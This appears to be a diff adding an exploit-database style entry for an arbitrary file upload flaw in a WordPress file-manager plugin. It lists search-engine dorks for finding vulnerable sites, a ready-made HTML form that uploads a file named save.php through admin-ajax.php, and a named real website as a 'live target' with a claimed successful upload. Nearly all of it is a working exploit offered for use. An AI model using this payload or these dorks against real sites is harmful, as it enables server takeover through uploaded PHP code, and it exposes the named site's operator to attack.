@@ -1,0 +1,21 @@
+EXPLOIT TITLE: Arbitrary File Upload Vulnerability in Front end file upload and manager Plugin
+Author: WWW.PLUGINVULNERABILITIES.COM
+Reference: https://www.pluginvulnerabilities.com/2016/09/19/arbitrary-file-upload-vulnerability-in-front-end-file-upload-and-manager-plugin/
+
+Dork: 
+inurl:/plugins/nmedia-user-file-uploader/
+inurl:/wp-content/uploads/user_uploads/
+
+<html>
+<body>
+<form action="[WordPress Site]/wp-admin/admin-ajax.php" method="POST" enctype="multipart/form-data">
+<input type="hidden" name="action" value="nm_filemanager_upload_file" />
+<input type="hidden" name="name" value="save.php" />
+<input type="file" name="file" />
+<input type="submit" value="Submit request" />
+</form>
+</body>
+</html>
+
+Live Target: http://www.volta-pagina.it/
+Result (200 OK): http://www.volta-pagina.it/wp-content/uploads/user_uploads/yolo.jpg
